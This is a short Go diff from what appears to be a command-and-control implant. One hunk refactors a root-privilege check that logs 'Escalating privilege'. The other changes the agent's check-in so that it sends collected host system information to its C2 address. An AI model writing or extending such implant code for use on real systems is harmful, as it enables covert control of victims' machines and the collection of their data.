@@ -142,7 +142,7 @@ test_agent:
 
 		// check if agent is responsive
 		if isAgentAliveSocket() {
-			if os.Geteuid() == 0 && agentutils.ProcUID(pid) != "0" {
+			if os.Geteuid() == 0 && util.ProcUID(pid) != "0" {
 				log.Println("Escalating privilege...")
 			} else if !replace_agent {
 				log.Printf("[%d->%d] Agent is already running and responsive, waiting...",
@@ -299,7 +299,7 @@ connect:
 	log.Printf("Checking in on %s", def.CCAddress)
 
 	// check in with system info
-	err = c2transport.CheckIn()
+	err = c2transport.CheckIn(agentutils.CollectSystemInfo())
 	if err != nil {
 		log.Printf("CheckIn error: %v, sleeping, will retry later", err)
 		util.TakeASnap()
